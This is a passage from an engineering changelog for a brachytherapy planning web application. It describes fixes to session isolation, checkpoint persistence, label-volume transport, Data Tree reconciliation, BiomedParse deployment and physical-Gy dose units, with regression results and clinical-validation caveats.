  background path. Generation fencing invalidates delayed callbacks so an older
  `running` snapshot cannot overwrite a newer `ready` or deleted-case state.
- Checkpoint logging now identifies each phase and duration: `started`, account
  capacity scan, artifact encoding, prepared array counts, snapshot write, artifact
  commit/prune, `completed`, and `failed` with a traceback. Agent hydration logs
  construction, snapshot read, array decode, CT restore, and total duration. These
  fields make a production stall diagnosable without guessing from the browser.
- Persisted nested array references are indexed recursively and reused after a server
  restart when their planning version is unchanged. Quota accounting scans the user
  workspace once per checkpoint and applies incremental size deltas for each new or
  replaced artifact.
- The task journal emits an SSE comment heartbeat every 10 seconds while a worker is
  running. Comments do not create a fake step or call an LLM, but they keep proxies,
  browsers, progress timers, and reconnect logic alive during quiet computation.
- Workspace hydration now has an authoritative clinical-resource gate. Empty cases,
  deleted cases, and stale session generations skip restoration and clear their notice
  timers. Existing clinical sessions still restore asynchronously with generation
  fencing.
- Final report/review text no longer prints the internal-looking observed-metrics
  disclaimer as a standalone sentence; it uses a concise clinical review
  instruction instead, while retaining the safety requirement to verify thresholds
  against applicable evidence.

### How to diagnose a real delay

Search the server log by session ID and follow the first missing checkpoint phase:

1. `workspace checkpoint started` confirms scheduling reached the worker.
2. `capacity scanned` distinguishes account-tree scanning from later work.
3. `artifacts encoded` reports newly-created versus reused arrays.
4. `snapshot written` and `artifacts committed` separate JSON/SQLite/prune time.
5. `workspace checkpoint failed` includes the exception and traceback; a deleted
   workspace is discarded rather than recreated.

For a user-visible task, the terminal answer is independent of steps 1-5. A first
checkpoint containing newly-created clinical arrays can still consume disk I/O, but
it runs in the background and the case remains usable. A browser disconnect only
detaches the SSE subscriber; the case-owned task journal remains resumable until the
user explicitly presses Stop.

### Verification

- Full regression suite: **320 passed, 2 skipped, 3 warnings** in 29.83 seconds.
- Targeted checkpoint, task, frontend, and workspace regressions: **81 passed, 3
  warnings**.
- `py_compile` passed for the modified server, workspace, task, planning, surgical
  guide, and response modules.
- `node --check` passed for the modified workspace, UI API, and report-export scripts.
- `git diff --check` passed. The remaining warnings are existing third-party
  SimpleITK SWIG deprecation warnings.

These changes affect persistence scheduling, stream liveness, restore gating, and
user-facing wording only. They do not change the clinical planning algorithm, dose
model, coordinate conversion, obstacle filtering, or review thresholds.

## 2026-07-28 - Full workspace and manual-mask follow-up audit

### Scope

This pass rechecked the current implementation against the long-running
workspace, viewer, manual-planning, monitoring, and segmentation requirements.
The review included the authenticated session boundary, background hydration,
checkpoint scheduling, uploaded-mask provenance, Data Tree construction,
label-volume loading, planning refreshes, manual workflow controls, surgical
guide controls, and the BiomedParse fallback catalog.

### Confirmed fixes and contracts

1. **Session performance and isolation**: new/selected cases paint their shell
   before snapshot and clinical-artifact work. CT, label volumes, planning
   products, report figures, and mesh requests carry a case generation fence.
   Switching or creating a case detaches the browser stream but does not cancel
   another case's server task. Empty cases skip clinical hydration entirely.
2. **Durability and restart recovery**: transcript/control-plane state is
   committed before the final response; large arrays and mesh artifacts are
   checkpointed in a daemon worker. Checkpoint logs identify snapshot read,
   array encoding/reuse, quota work, write, commit, and failure phases. Running
   work is restored as interrupted after restart, never as falsely completed.
3. **Manual uploaded CTV/OAR masks**: the server aligns a supplied label to the
   CT physical grid, stores the aligned label image as the canonical mask, and
   records `manual_label`/`uploaded_unknown` provenance. An opaque OAR mask is
   exposed as numbered `OAR 1`, `OAR 2`, ... nodes under Traversable; it is not
   guessed to be stomach, liver, bone, or another anatomical structure. The
   response immediately contains normalized `organs`, `organ_names`, and
   `organ_counts`, so Data Tree creation does not depend on 3D reconstruction.
4. **OAR Data Tree and viewer reconciliation**: the upload response, binary
   `/api/viewer/label_volume`, and `/api/viewer/organs` are reconciled in the
   same session. Metadata is painted first, label pixels are derived as a
   fallback, and the organs endpoint remains the authoritative final metadata
   source. Empty metadata snapshots cannot overwrite non-empty live OAR rows.
   New-case reset clears `oarSource`, paths, labels, meshes, dose overlays,
   report content, and file selections, preventing cross-case inheritance.
5. **Data Tree presentation**: parent visibility/opacity changes propagate to
   descendants; child edits remain local. Labels, colors, opacity, categories,
   and visibility survive a refresh when the source is unchanged. Uploaded
   source changes intentionally reset ontology-derived names/categories while
   preserving only presentation state that is still meaningful.
6. **Planning and dose UI**: planning refreshes are session-fenced and update
   trajectories, seeds, needles, dose, DVH, color bars, and report-facing
   metrics without requiring a manual 3D reconstruction. Dose visibility follows
   the Planning parent, and slice changes invalidate/repaint dose contours in
   the same coordinate frame. UI dose fields remain absolute Gy while model
   inputs remain normalized through the shared scale.
7. **Manual workflow and monitoring**: manual stages expose running/done/error
   progress states, refresh the result view, reconcile OAR metadata, and save a
   compact checkpoint. Monitor feedback is emitted as a structured assistant
   message instead of a bare system bubble; screenshots are case-scoped,
   stage-aware, throttled, grouped into one gallery, and temporarily focus the
   relevant viewer/seed pair before restoring the user's panel and camera.
   Monitoring also has an explicit case-owned presentation state: the page
   edge, chat header avatar, status badge, and accessibility labels breathe
   continuously until monitoring is finished or the case is changed. Surgical-
   guide generation, parameter editing, version selection, STL validation, and
   guide mesh restoration are available from the Input panel and the chat UI.
8. **CTV model availability**: the validated pancreatic nnU-Net path remains
   the only pancreatic production choice. Non-pancreatic supported UI entries
   use the BiomedParse v2 route and are marked according to local weight
   availability; unverified legacy VoCo aliases are excluded from the human
   selector and public OAR tool registry.
9. **Public Python API correctness**: `tool_factory.OAR_seg.__all__` no longer
   exports removed VoCo classes. Star-import now succeeds and exposes only
   symbols that actually exist and are registered.
10. **Monitoring language and lifecycle**: stage feedback, interference
    warnings, screenshot questions, and the final monitoring summary now use
    the active UI language. A running stage does not create a screenshot, a
    completed stage does not reuse a stale target, and a failed optional
    screenshot remains a scoped warning rather than replacing the assistant's
    structured advice.

### Deliberate safety and product boundaries

- An uploaded opaque OAR label is not assigned an anatomical name or an
  automatic non-traversable classification. The clinician can rename it or
  move it under the Data Tree's non-traversable parent; planning reads that
  current whitelist. Verified default bone/cartilage/vessel policy remains in
  force for model-derived structures.
- Background hydration is allowed to continue after a case switch, refresh, or
  browser disconnect, but every completion is fenced before it can paint the
  active case. Explicit Stop is the only normal UI cancellation path.
- A failed optional web source, screenshot, or checkpoint is reported as a
  scoped warning and does not erase a valid clinical result. Unsupported
  medical conclusions remain subject to source-backed review and clinician
  sign-off.

### Verification

- Full regression suite: **330 passed, 2 skipped, 3 warnings**.
- Uploaded-mask and workspace frontend regressions: **75 passed, 3 warnings**.
- Training-monitor lifecycle and presentation regressions: **4 passed, 3
  warnings**.
- `compileall` passed for `AgenticSys.py`, `agent_runtime`, `tool_factory`, and
  `web`.
- JavaScript syntax checks passed for all modified browser modules, including
  workspace, viewer-volume, UI API, manual planning, and surgical-guide code.
- `git diff --check` passed. The remaining warnings are third-party SimpleITK
  SWIG deprecation warnings.

The reviewed changes preserve the established CT physical-coordinate chain,
obstacle filtering, dose model, and clinical review thresholds. The remaining
clinical requirement is external: a qualified radiation oncologist and medical
physicist must verify contours, source strength, dose, constraints, and the
manufactured guide before clinical use.

## 2026-07-28 - Phase 1 session isolation, staged restore, and label-volume acceptance

### Scope and confirmed root causes

This pass completed the first-stage Session remediation before any login-page
work. It traced the supplied slow-loading, cross-case needle, missing OAR,
`label_volume` 500, stale viewer-state, deleted-workspace warning, and
checkpoint logs through both the authenticated server workspace and the
browser restore pipeline.

The confirmed causes were:

1. Agent hydration decoded CT-sized arrays while holding a process-wide cache
   lock. A cold case could therefore serialize otherwise independent case
   switches, chat starts, and workspace operations.
2. Browser IndexedDB accounting enumerated the complete cache from ordinary
   reads and writes. Cache size management was on the first-paint path.
3. The visible case shell, top-bar session identity, clinical artifact restore,
   and report-figure restore were coupled to one transition promise. A selected
   case could appear unresponsive until heavy resources completed.
4. Late requests were only partially generation-fenced. A CT/label/planning
   response or progress callback owned by case A could repaint case B after a
   rapid switch or new-case creation.
5. Deleting a case moved its workspace before its detached worker had stopped.
   The worker could then read or persist the deleted path, generating
   `WorkspaceNotFound`, SimpleITK read failures, and repeated UI-bridge
   persistence warnings.
6. TotalSegmentator executions could overlap on one device and a timed-out
   child process did not reliably terminate its process group. This explained
   stacked GPU work and apparent OAR hangs rather than a normal segmentation
   runtime.
7. Model-derived OAR labels include values above 255, but an 8-bit label-volume
   transport/cache path truncated them. The backend could correctly report
   50+ structures while the Data Tree and 2D viewer showed only a few, wrong,
   or empty labels.
8. The frontend relied on one completion event shape. Planning child events
   carrying `parent_tool`, manual uploaded masks, and restored metadata could
   finish without an immediate Data Tree and viewer reconciliation.
9. Review context serialization could encounter runtime locks such as
   `_thread.RLock`. This produced slow retry/fallback behavior after a valid
   planning result.

### Implemented remediation

- Snapshot array decoding now happens outside the Agent-cache lock. Hydration
  constructs a candidate Agent privately and atomically publishes it only when
  the case generation still matches. Snapshot objects are process-cached by
  user, case, and durable file identity.
- Restore is explicitly staged. The selected sidebar row, top-bar session ID,
  title, chat transcript, timestamps, execution trace, task state, input
  paths, and saved controls paint first. CT is restored as the geometry
  dependency; label and planning restoration then run concurrently; meshes,
  DVH, report figures, and other large artifacts follow in background.
- A scoped restore token combines session ID and restore generation. Every
  asynchronous CT, label, organ metadata, planning, DVH, report, screenshot,
  cache, and progress completion validates this token before committing UI
  state. Superseded browser requests are aborted without being presented as
  server timeouts.
- Empty-case creation has a zero-resource fast path. It updates the session
  shell immediately, clears every old clinical presentation surface, and does
  not display `Opening case` or `Loading case resources`.
- IndexedDB uses one deferred baseline scan plus O(1) incremental byte deltas.
  Reads/writes return with their own transaction rather than waiting for a
  fixed delay or full-store enumeration; eviction remains background work.
- Case deletion first marks and stops the case-owned worker, waits for worker
  teardown, invalidates persistence callbacks, clears all browser namespaces,
  and only then moves the durable workspace to the recycle bin. Deleted-case
  bridge updates are ignored rather than recreating the path.
- TotalSegmentator now has one execution lock, a device-scoped lifetime, a
  bounded 900-second subprocess timeout, and process-group termination. GPU
  ownership is released on success, timeout, cancellation, and exception.
- Label-volume responses use a versioned binary contract with explicit bytes
  per voxel. OAR labels are transported as `uint16`; nearest-neighbour
  resampling preserves discrete labels on the CT physical grid. The frontend
  rejects incompatible legacy OAR caches and reads variable-width CTV/OAR
  payloads correctly.
- Successful automatic segmentation and manual CTV/OAR import both return
  normalized label names/counts/provenance, load organ metadata immediately,
  force a fresh label volume, rebuild Data Tree nodes, and repaint axial,
  sagittal, and coronal viewers without waiting for a 3D reconstruction.
- Planning refresh recognizes both direct tools and pipeline child events
  through `parent_tool`, restoring needles, seeds, trajectories, dose, DVH,
  report state, and Planning Data Tree children in the owning case only.
- Viewer controls, Data Tree hierarchy, colors, opacity, visibility, display
  mode, slices, camera, overlays, DVH settings, report/editor content,
  screenshots, transcript, execution trace, and task state are persisted as
  case-owned presentation state. Restored presentation is applied after live
  clinical nodes exist, so stale JSON cannot replace current arrays.
- Review payload construction recursively strips runtime-only objects. Locks,
  callbacks, images, and other non-serializable internals do not trigger an
  extra LLM retry or erase valid plan metrics.
- A bounded, patient-data-free browser performance history records transition
  start/finish, shell first paint, snapshot receipt, CT first paint, label/Data
  Tree readiness, planning/DVH readiness, report readiness, and fully
  interactive completion.

### Acceptance matrix

| Scenario | Verification method | Result | Status |
|---|---|---|---|
| Create an empty case while another case is loaded | Real browser against an isolated local runtime | Sidebar, title, top-bar session identity, blank chat, inputs, Data Tree, viewers, DVH, and report switch immediately; no clinical loader is started | Pass |
| Switch from a planned/CT case to a clean case | Real browser rapid switch | Clean case has no CT, OAR, needles, seeds, dose, progress, DVH, or report residue | Pass |
| Switch back to a clinical case | Real browser staged restore | Shell and chat paint first; scoped non-blocking loader remains during hydration; CT and saved state return without freezing navigation | Pass |
| First visible switch response | Browser observation including automation overhead | Shell/highlight/header changed in approximately 0.47 s | Pass |
| Tiny CT case fully restored | Browser observation including automation overhead | CT path and resources restored and loader dismissed in approximately 1.87 s | Pass |
| Late response after rapid switch | Frontend generation-fence regression tests | Stale response cannot mutate the current case | Pass |
| Switch while another case task runs | Chat-task and frontend tests | Task remains case-owned and running; switching does not call Stop or copy progress to the new case | Pass |
| Refresh/reopen completed task | Workspace/chat round-trip tests | User message, assistant reply, timestamps, execution trace, planning data, DVH, and report restore from the durable snapshot | Pass |
| Delete case with detached task | Route/task teardown tests | Worker is stopped before recycle-bin move; late checkpoint/UI bridge writes are discarded | Pass |
| Automatic OAR segmentation | Spatial-alignment and viewer tests | Full `uint16` label set populates Data Tree and all 2D viewers on the CT physical grid | Pass |
| Manual CTV/OAR import | Upload/viewer/frontend tests | Nodes and overlays appear immediately with provenance; opaque OAR labels use numbered names rather than invented anatomy | Pass |
| Viewer presentation round trip | Workspace frontend tests | hierarchy, colors, opacity, visibility, display mode, slices, camera, overlays, DVH, and report state survive switch/refresh | Pass |
| Review payload with runtime locks | Multi-agent regression tests | Safe context is produced without pickle/serialization failure or redundant model retry | Pass |
| Browser cache write/delete | Frontend cache tests | No per-operation full-store scan; deleted session namespaces are removed | Pass |

### Verification evidence

- Full automated regression suite: **341 passed, 2 skipped, 3 warnings** in
  **29.49 seconds**.
- Targeted Session, task, OAR alignment, monitor, and browser-state suites:
  **104 passed**.
- Modified browser modules passed `node --check`.
- Modified Python modules passed compilation during the regression run.
- `git diff --check` passed; remaining messages are line-ending notices only.
- Browser acceptance used a separate temporary runtime and account, two cases,
  and an uploaded SimpleITK CT. The runtime was not shared with production.

The three warnings are existing third-party SimpleITK SWIG deprecations. This
Phase 1 work changes isolation, persistence, scheduling, label transport, and
presentation restoration. It does not change dose normalization, trajectory
geometry, obstacle filtering, source strength, clinical thresholds, or the
validated pancreatic segmentation model. Login-page changes remain deferred
until this Session acceptance is complete.

## 2026-07-28 Segmentation-to-Viewer and Data Tree Reconciliation

### Root causes found

- Segmentation completion updated agent memory, binary label transport, OAR
  metadata, and viewer presentation through separate asynchronous paths. A
  successful mask could therefore exist on the server while the Data Tree still
  showed an empty OAR branch and the 2D canvases remained in CT-only mode.
- The per-slice fallback endpoint could read a raw legacy NumPy array while the
  label-volume endpoint aligned an uploaded mask from its physical image
  metadata. The two paths could consequently disagree in direction or origin.
- A saved initial CT-only presentation was indistinguishable from an explicit
  user choice, so a fresh segmentation could be loaded correctly and then
  hidden again by an old snapshot.
- Dose and DVH were real asynchronous products, but their Data Tree control
  nodes were not always reconciled at the moment the payload became available.

### Changes made

- `loadLabelVolumes()` now derives CTV/OAR readiness from non-zero decoded
  voxels, unions OAR labels present in the binary volume with server metadata,
  preserves numbered names for opaque uploaded masks, and always re-renders the
  tree and all three current slices through the session-scoped
  `reconcileSegmentationViewerState()` path.
- New segmentation and mask-import completion paths explicitly reset the fresh
  presentation default; ordinary session restoration preserves an explicit
  user's saved display choices. This keeps newly generated CTV/OAR overlays
  visible without overwriting deliberate later hide/opacity changes.
- `/api/viewer/overlay` now uses the same physical-grid resolver as
  `/api/viewer/label_volume`, including uploaded-mask alignment and guarded
  legacy resampling. A viewer cannot silently paint an unaligned second copy of
  a mask.
- Every visible tree object receives stable node/object/session/case/planning
  identifiers, version, status, loading/error state, appearance, and context
  actions. The reconcile path covers CT, CTV/OAR masks, needles, seeds, dose,
  dose contours/iso-surfaces, DVH, meshes, annotations, and surgical guides.
- Dose overlay and DVH completion now reconcile and render their Data Tree nodes
  immediately after real payloads arrive. No empty geometry object is created;
  unavailable products remain represented only by the existing status-aware
  control tree.

### Verification

- Targeted spatial-alignment and workspace-front-end suite: **77 passed**.
- Full suite: **354 passed, 2 skipped, 3 warnings**.
- Modified JavaScript passed `node --check`; modified Python routes passed
  `py_compile`; `git diff --check` passed.
- The warnings are existing SimpleITK SWIG deprecation warnings. This change
  verifies the software/data path and does not claim clinical segmentation
  accuracy beyond the already validated pancreatic route.
## 2026-07-28 Manual Planning and Capability Follow-up

### Seed transactions and viewer interaction

- Added a versioned `update_seeds` transaction that validates stable Seed IDs,
  owning Needle IDs, physical projection, implant-span clamping, optional
  spacing snap, session ownership, and optimistic version conflicts.
- 2D Seed editing now uses the projected physical Needle segment rather than a
  free screen-space move. Hold-to-drag prevents accidental edits, and the
  themed context menu exposes Seed ID, owning Needle, coordinates, and delete.
- 3D and 2D edits use the same persisted planning record. Dose, DVH, report,
  and Surgical Guide artifacts are marked stale or recomputed through the
  existing transaction path; failed writes roll back the visual edit.
- Monitor Seed evidence temporarily highlights the actual Seed meshes and
  restores camera, scale, materials, and emissive state after capture,
  including the empty-bounding-box failure path.

### Monitor and Surgical Guide

- Monitor is case/run scoped and has a global edge effect only while active;
  the Monitor buttons have no idle animation. Stage and dose checkpoints are
  aggregated, localized, and posted in the BrachyBot chat stream.
- Geometry advice uses real Seed dimensions/clearance, Needle collision and
  non-traversable-mask checks, stale dose/DVH/report state, and guide-version
  consistency. Seed interference evidence identifies the pair and requests a
  focused 3D capture rather than an unrelated panel screenshot.
- Manual Fine Planning exposes real guide generation, update/preview/export,
  saved versions, Needle selection, validation, and patient-specific
  parameter controls. The guide is versioned and invalidated when its source
  plan changes.

### Data Tree and BiomedParse

- Planning, Dose, Seed, Needle, guide, and segmentation visual objects retain
  stable node/object/session/planning identifiers. Parent visibility/opacity
  changes propagate downward; child changes remain local and do not mutate
  parents, siblings, or unrelated branches.
- BiomedParse v2 uses explicit site prompts, official runtime/checkpoint
  discovery, physical-space restoration, technical validation records, and
  Data Tree/2D/3D save checks. Capability colors are runtime-driven: verified
  pancreatic nnU-Net is green, installed but research-only routes are orange,
  unavailable routes are red/gray with a reason. This does not claim clinical
  accuracy without real-case validation.
- Pancreatic tumor selection no longer exposes the unverified legacy VoCo
  alternative; old persisted values are compatibility-mapped to the validated
  pancreatic path.

### New verification evidence

- Targeted regression suite after the final interaction fixes: **100 passed,
  3 warnings**.
- Modified JavaScript modules passed `node --check`.
- Modified Python modules passed `py_compile`.
- Added regression coverage for 2D Seed projection/transaction hooks, Monitor
  focused-capture restoration, and real Surgical Guide manual workflow
  actions.
- Remaining warnings are third-party SimpleITK SWIG deprecations. Medical
  segmentation quality and BiomedParse clinical validity remain separate from
  the verified software/data-path checks and require clinical validation.

### UI follow-up: Monitor edge, guide controls, and Tumor Type colors

- Replaced the clipped `body::after`-only Monitor halo with a real fixed
  `monitorEdgeOverlay` at the document root. It is hidden outside Monitor,
  has no pointer interception or layout footprint, and is the only active edge
  layer while the legacy selector is suppressed to prevent double glow.
- Guide parameter `select` and `option` controls now use the same background,
  border, text, focus ring, padding, and radius tokens as the numeric inputs;
  the multiple Needle selector has a readable minimum height and resize affordance.
- Tumor Type colors now encode callable availability only: green when the
  registered route is callable (including experimental BiomedParse), red when
  it is unavailable. Maturity and clinical-validation details remain in the
  explanatory status text, not as a third dropdown color.

### 2026-07-29 interaction polish verification

- The Monitor edge now uses a plain `rgba` fallback before the theme-token
  `color-mix` declaration, a viewport inset, and compositor hints. This keeps
  the single top-level glow visible in embedded Chromium builds that do not
  support `color-mix`; the hidden attribute still disables it completely when
  Monitor is inactive.
- The Puncture Guide parameter panel now owns its dark surface and
  `color-scheme`, forces native empty/multiple selects to use workspace
  tokens, and renders an explicit `No planned needles available` empty state.
  The needle/version controls use a vertical layout so the native grey empty
  surface is not mistaken for an unresponsive control.
- Tumor Type applies the callable/unavailable colors before the asynchronous
  capability probe resolves. The validated pancreatic route receives a
  provisional green state and can still be downgraded by the runtime probe;
  all other routes remain red until the server reports a callable route.
  Cache-busting versions were incremented for the modified CSS and JS assets.
- Regression evidence: `tests/test_workspace_frontend.py` **74 passed**;
  Full suite: **355 passed, 2 skipped, 3 warnings**;
  modified JS passed `node --check`; `git diff --check` passed.

## 2026-07-29 - Restart hydration, planning artifacts, and chat finalization

This follow-up addresses the seven restart/session symptoms reported after a
completed plan. The goal was to repair the data-plane ownership and restore
ordering, not to hide missing objects with a second viewer-only rendering path.

### 1. Cold restart versus session switch

The cold-start path scheduled background restoration in `loadSessions()` and
the later `init()` path scheduled it again. Both jobs could clear and rebuild
the same CT, labels, planning arrays, meshes, and report state. A normal
session switch happened to have only one restore job, which explains why it
looked much faster and more complete.

The shared scheduler now records the active session and restore generation.
Startup and switching deduplicate the same `(session, generation)` restore,
and stale callbacks stop before publishing into a newer session. The fast
JSON snapshot still paints chat and shell state first; CT, labels, planning
arrays, meshes, report figures, and presentation state hydrate in the
background. A failure clears the spinner and leaves an explicit recoverable
state instead of an infinite `loading source` indication.

### 2. Planning children, dose, and Surgical Guide

The planning endpoint can legitimately return `202` while the server is
decoding durable NPY/JSON sidecars after a restart. The frontend previously
treated that response as an empty plan. `refreshPlanningUI()` now polls the
case-owned endpoint with bounded backoff during background restoration. Once
authoritative data arrives it reconciles trajectories, needles, seeds, dose,
DVH, contours/iso-surfaces, and guide metadata into the Data Tree and repaints
all three 2D slices. Guide restoration/generation starts independently from
slow mesh decoding and is never allowed to overwrite a newer session.

This keeps the Data Tree as the source of viewer visibility and prevents
`Dose Surface` from reporting a false absence merely because the first cold
restore response was still pending.

### 3. Clinical Evaluation and report persistence

Clinical evaluation was previously refreshed only on the slow mesh completion
branch. It is now rebuilt as soon as planning metrics and label data are
available, while mesh work remains background work. Report auto-fill is also
started independently from mesh loading. Large report figures retain the fast
IndexedDB path, but new captures are additionally queued to the authenticated,
case-owned screenshot endpoint. Restore retries the IndexedDB startup race and
can fall back to the server-owned URL, so a browser restart no longer makes
the report body or figures depend on a warm browser cache.

### 4. Monitor edge state

The monitor halo remains a single fixed, non-interactive viewport layer. This
follow-up strengthens the fallback and theme-token shadows substantially while
keeping `pointer-events: none`, no layout footprint, no idle button animation,
and no effect when the overlay has its `hidden` attribute. The glow is therefore
visible around the whole UI only during Monitor mode and cannot block a viewer
or session operation.

### 5. Duplicate execution trace after reconnect

The live SSE writer and detached task finalizer can finish in either order.
The finalizer now checks authenticated task time, user text, existing trace,
and an existing bot response before appending durable rows. The restore renderer
also removes an older incomplete duplicate when a complete turn with the same
workflow fingerprint already exists. Legitimate repeated questions at a new
time remain separate. Internal `workspace_checkpoint` steps are filtered from
the user-facing trace.

### 6. Tool-only dose questions

Some low-risk tool-only turns reached a terminal state without model prose and
were rendered as `Tools executed. Check the execution trace above for results.`
For dose-distribution questions only, the finalizer now reads the current
case-owned `dose_metrics`, waits briefly for an in-progress planning result,
normalizes fractional V100/V150/V200 values to percentages, and emits a
localized metric summary. This is a narrow data-backed fallback; it does not
invent answers for general questions and reports that dose data is unavailable
when no result exists.

### 7. Tumor Type capability status

The BiomedParse v2 adapter, site prompts, spatial restoration, Data Tree
registration, and viewer routes are present in the codebase. However, both the
current local environment and the checked remote deployment lack the official
BiomedParse runtime/checkpoint paths (`BIOMEDPARSE_ROOT` and
`BIOMEDPARSE_V2_CHECKPOINT`). Therefore non-pancreatic BiomedParse options are
correctly red/unavailable in this deployment; marking them green would produce
a button that fails at inference time. The selector uses only two option
colors: green means the registered route is callable in the current runtime,
red means it is not. The explanatory status text gives the concrete missing
runtime reason. The validated pancreatic nnU-Net route remains the only green
route when its local weights are present. This is a deployment limitation, not
a claim that BiomedParse has no theoretical capability.

### Verification

- Full Python suite: **355 passed, 2 skipped, 3 warnings**.
- Modified JavaScript modules passed `node --check`.
- `web/routes/planning_routes.py` passed `py_compile` with the incomplete
  ambient `PYTHONHOME`/`PYTHONPATH` cleared.
- `git diff --check` passed.
- The three warnings are third-party SimpleITK SWIG deprecations.
- Clinical segmentation quality for BiomedParse remains unverified without
  the official runtime, checkpoint, and representative test cases.

## 2026-07-29 - Physical-Gy planning contract and BiomedParse deployment validation

### 1. Dose values and model calibration are separate contracts

`in_lowest_energy` and `out_highest_energy` now store physical dose values in
Gy. Their defaults are both `120`, and new planning records explicitly store
`dose_value_unit="gy"`. The names remain for backward API compatibility, but a
value of `120` now unambiguously means 120 Gy.

The DoseUNet output remains a normalized model value. The current model
calibration is independent of the prescription fields:

- model output `1.0` = `120 x 1.59` = `190.8 Gy`;
- 120 Gy therefore maps to a model-space threshold of
  `120 / 190.8 = 0.6289308176`;
- physical isodose levels are prescription multiples, so the default levels
  are 120, 180, 240, and 480 Gy.

The conversion helpers are centralized in `plans/dose_pre/model_loader.py` and
are used by planning, evaluation, safety checks, reporting, server routes, and
the Web UI. Historical sessions that lack unit metadata and store
`in_lowest_energy=1` are migrated using the old prescription-multiplier
contract, so an old value of `1` remains 120 Gy instead of being reinterpreted
as 1 Gy or 190.8 Gy.

### 2. BiomedParse v2 is technically callable on the remote deployment

The prior report described a deployment that lacked the optional runtime and
checkpoint. The current RTX 3090 deployment now has:

- the upstream BiomedParse v2 checkout at commit
  `e02096c03af0d79c6994ffc2d60a49eeb0361e1f`;
- the official `biomedparse_v2.ckpt`;
- an isolated Python 3.10 runtime with the required inference modules;
- Detectron2 compiled for the RTX 3090 (compute capability 8.6);
- local `openai/clip-vit-base-patch32` tokenizer assets.

The adapter now fails closed if the checkout, checkpoint, runtime modules, or
local tokenizer assets are incomplete. It overrides the upstream tokenizer
path before Hydra model construction, avoiding a hidden network request during
the first inference. A remote isolated-worker smoke test completed model
construction, checkpoint loading, CUDA transfer, and inference on a synthetic
3D volume, returning the expected output shape and confidence metadata.

Remote acceptance also exposed a virtual-environment discovery defect:
resolving `.venv/bin/python` followed its symlink to `/usr/bin/python3.10` and
silently bypassed the isolated environment. Runtime discovery now preserves the
virtual-environment entrypoint path. The deployed capability probe consequently
reports the intended `.venv/bin/python`, no missing modules, and
`available=true`.

This establishes the technical call chain, not clinical contour quality.
Non-pancreatic BiomedParse routes remain experimental/research-only until
representative cases are reviewed by qualified clinicians. The validated
pancreatic nnU-Net route remains unchanged and does not use this fallback.

### 3. Verification

- Full local Python suite: **372 passed, 2 skipped, 3 warnings**.
- Targeted BiomedParse tests covered capability probing, worker handoff,
  spatial metadata restoration, and four-state catalog behavior.
- Remote smoke validation exercised the real official checkpoint and CUDA
  runtime; the empty synthetic mask was expected because the input contained
  no tumor anatomy.
- Remote post-sync contract, BiomedParse, and screenshot/trace tests:
  **22 passed, 3 third-party warnings**.
- Model binaries and tokenizer assets remain ignored deployment artifacts and
  are not committed to Git.

## 2026-07-30 - Planning completion convergence

The planning-completion path was hardened after a completed planning trace
produced metrics and arrays on the server but left the Data Tree, 3D viewer,
clinical evaluation, report, and surgical-guide node empty. The root cause was
a client-side completion detector that required one exact rendered trace shape
(`type: "tool"`) and a narrow top-level tool list. Pipeline sub-steps and
provider-specific compact events could therefore complete without scheduling
the case refresh.

`web/app/static/js/brachybot-chat-todo.js` now records planning work from the
raw `tool` and `parent_tool` fields for the full planning family. Completion
is recognized at the terminal step, final response, or stream `done` boundary,
and all of those paths schedule the same session-fenced `refreshPlanningUI()`
call. The refresh uses the case-owned results endpoint with bounded
pending-result polling, so a short persistence race is not mistaken for an
empty plan.

`web/app/static/js/brachybot-dvh-planning.js` now treats surgical-guide
restoration/generation as part of the planning refresh contract. Once the
authoritative planning data is available, the guide promise is reconciled with
the Data Tree and 3D scene before the normal report repaint; background restore
keeps the shell responsive while still repainting when the guide is ready.
This single convergence path updates seeds, needles, dose overlay, DVH,
clinical evaluation, report data/figures, and the surgical guide without
creating a second source of truth.

Regression coverage was added in `tests/test_workspace_frontend.py` for compact
and parent-tool planning events, pending-result retry, and guide/Data Tree
reconciliation. JavaScript syntax checks and the focused Python frontend tests
must pass before this change is pushed.

The accompanying runtime log also exposed a persistence bottleneck: candidate
trajectory arrays were being serialized as thousands of nested NumPy sidecars
on every debounced memory checkpoint. Several stale generations then waited on
the same case lock and performed the same expensive work before being discarded;
one background checkpoint took about 700 seconds. `web/workspace_store.py` now
skips regenerated planning-grid workspaces and large candidate collections,
keeps the authoritative seed/needle/dose/metric snapshots, checks generation
freshness before walking the agent, and retries a checkpoint without blocking
behind an active older generation. This preserves restartable clinical results
while keeping transient optimizer state out of the session save path.

The same log showed a flattened CTV array reaching physical needle validation
against a `(48, 512, 512)` CT. `tool_factory/seed_plan/planning_pipeline.py` now
normalizes a legacy one-dimensional mask only when its voxel count exactly
matches the current CT grid and rejects other-grid masks instead of bypassing
the safety check. Regression tests cover both cases.

## 2026-07-29 - Data Tree transactions and three-level Scene export

This change replaces presentation-only Data Tree mutations and ad hoc
downloads with one case-owned data service. The Data Tree remains the
visualization controller, but structure classification, deletion, and export
are now resolved from durable backend objects.

### 1. Stable Structure identity and bidirectional classification

CTV and OAR labels are registered as stable objects such as
`structure:ctv:1`, `structure:oar:12`, and
`structure:embedded:2`. `web/structure_service.py` keeps the source mask,
spatial metadata, and stable object identity separate from its current
clinical classification.

`OAR -> CTV` and `CTV -> OAR` now execute one backend transaction:

- update `structure_overrides` and rebuild effective CTV/OAR transport volumes;
- retain the original mask, source identity, name, and Data Tree appearance;
- update the authoritative arrays and label maps used by Viewer and Planning;
- mark Planning, Dose, DVH, Evaluation, Report, and Surgical Guide stale;
- persist the transaction so refresh and Session switching retain the class;
- reload the label cache with format version 3, including stable CTV/OAR
  object mappings.

The pancreatic model's labels 2-4 (artery, vein, and pancreas) are now real
OAR source objects instead of viewer-only labels. Imported unknown masks keep
their source labels and can be reclassified without fabricating anatomy names.

### 2. Type-aware backend deletion

The existing Data Tree context menu is retained and extended with `Delete`
for real objects and groups. A delete request first resolves and validates the
entire selection against the current case catalog, then mutates the backend.
The frontend updates only after a successful response.

Implemented handlers cover CT, CTV/OAR structures, trajectories, needles,
seeds, dose, iso-surfaces, DVH, Surgical Guide, Report data/PDF, screenshots,
report figures, and annotations. Dependency handling follows the data graph:

- deleting CT clears all case-owned clinical/planning memory and Report files;
- deleting a Needle removes its owned Seeds and stales dose-dependent results;
- deleting a Structure stales Planning, Dose, DVH, Evaluation, Report, and
  Guide without silently discarding the user's remaining geometry;
- deleting Dose invalidates DVH and Report;
- deleting screenshots/figures removes their chat/report references;
- high-risk actions use the BrachyBot confirmation dialog, not native
  `window.confirm`.

Structure batches are committed as one memory transaction. Heterogeneous
batches are prevalidated before their first mutation so a missing later object
